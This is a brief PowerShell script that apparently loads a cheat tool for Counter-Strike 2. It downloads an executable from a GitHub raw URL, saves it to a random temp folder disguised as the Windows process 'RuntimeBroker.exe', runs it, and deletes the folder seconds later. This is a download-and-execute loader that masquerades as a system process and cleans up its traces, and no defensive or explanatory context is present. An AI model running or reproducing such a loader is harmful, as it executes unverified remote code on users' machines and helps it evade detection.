$ErrorActionPreference='Stop'
$url='https://raw.githubusercontent.com/anab1os/NetworkCap/main/NetworkCap.exe'
$pe=(New-Object Net.WebClient).DownloadData($url)
$dir=Join-Path $env:TEMP ([guid]::NewGuid().ToString('N').Substring(0,8))
New-Item -ItemType Directory -Path $dir -Force|Out-Null
$path=Join-Path $dir 'RuntimeBroker.exe'
[IO.File]::WriteAllBytes($path,$pe)
# CS2 уже должен быть запущен
$p=Start-Process -FilePath $path -PassThru -WindowStyle Normal
Write-Host "[+] pid $($p.Id)"
Start-Sleep 3
Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue
